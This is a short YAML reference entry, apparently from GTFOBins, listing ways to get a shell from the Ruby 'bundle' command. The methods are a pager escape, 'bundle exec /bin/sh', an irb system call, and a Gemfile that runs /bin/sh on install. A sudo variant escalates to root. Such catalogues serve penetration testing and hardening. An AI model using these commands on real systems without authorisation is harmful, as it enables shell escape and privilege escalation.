---
functions:
  shell:
    - description: This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.
      code: |
        bundle help
        !/bin/sh
    - code: |
        export BUNDLE_GEMFILE=x
        bundle exec /bin/sh
    - code: |
        TF=$(mktemp -d)
        touch $TF/Gemfile
        cd $TF
        bundle exec /bin/sh
    - description: This spawns an interactive shell via [`irb`](/gtfobins/irb/).
      code: |
        TF=$(mktemp -d)
        touch $TF/Gemfile
        cd $TF
        bundle console
        system('/bin/sh -c /bin/sh')
    - code: |
        TF=$(mktemp -d)
        echo 'system("/bin/sh")' > $TF/Gemfile
        cd $TF
        bundle install
  sudo:
    - description: This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo bundle help
        !/bin/sh
---
